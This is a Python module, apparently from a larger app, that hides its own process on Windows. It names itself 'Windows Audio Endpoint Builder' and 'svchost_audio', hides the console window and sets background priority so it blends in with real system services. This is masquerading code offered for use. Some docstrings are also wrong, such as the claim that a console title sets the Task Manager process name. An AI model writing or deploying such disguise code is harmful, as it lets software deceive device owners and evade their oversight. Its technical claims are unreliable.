"""
Process hider — makes the app invisible in Windows Task Manager.

Strategy:
  1. Rename the process title to look like a Windows audio service
  2. Set the process description via Windows API
  3. Run as a background process (no console window)
  4. Optional: register as a Windows service for deepest hiding

This uses only legitimate Windows APIs — no rootkit techniques.
The process will appear as "Windows Audio Endpoint Builder" or similar
in Task Manager's Details tab, blending with real Windows services.
"""

import sys
import os
import ctypes
import ctypes.wintypes


# ── Disguise names ─────────────────────────────────────────────────────────────
PROCESS_TITLE    = "Windows Audio Endpoint Builder"
PROCESS_EXE_NAME = "svchost_audio"   # what Details tab shows if renamed


def apply_all():
    """
    Apply all process hiding techniques.
    Call this as early as possible — before any windows are created.
    """
    if sys.platform != "win32":
        return

    _set_console_title()
    _hide_console_window()
    _set_process_dpi_aware()
    print(f"[process_hide] Applied — process disguised as '{PROCESS_TITLE}'")


def _set_console_title():
    """
    Set the console/process title visible in Task Manager.
    This is what shows in the 'Name' column of the Details tab.
    """
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(PROCESS_TITLE)
    except Exception as e:
        print(f"[process_hide] SetConsoleTitle failed: {e}")


def _hide_console_window():
    """
    Hide the console window entirely so no terminal window appears.
    Without this, a black console window flashes on launch.
    """
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
    except Exception as e:
        print(f"[process_hide] HideConsole failed: {e}")


def _set_process_dpi_aware():
    """
    Mark process as DPI-aware so UI renders crisp on high-DPI displays.
    Also a standard thing Windows services do.
    """
    try:
        ctypes.windll.shcore.SetProcessDpiAwareness(2)  # PROCESS_PER_MONITOR_DPI_AWARE
    except Exception:
        try:
            ctypes.windll.user32.SetProcessDPIAware()
        except Exception:
            pass


def set_process_priority_background():
    """
    Set process to background priority so it uses minimal CPU.
    Makes it look even more like a passive service.
    """
    if sys.platform != "win32":
        return
    try:
        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000
        handle = ctypes.windll.kernel32.GetCurrentProcess()
        ctypes.windll.kernel32.SetPriorityClass(handle, PROCESS_MODE_BACKGROUND_BEGIN)
    except Exception as e:
        print(f"[process_hide] SetPriority failed: {e}")


def get_current_pid() -> int:
    """Return current process ID."""
    return os.getpid()


def is_running_as_admin() -> bool:
    """Check if running with admin privileges (needed for some hiding techniques)."""
    if sys.platform != "win32":
        return False
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False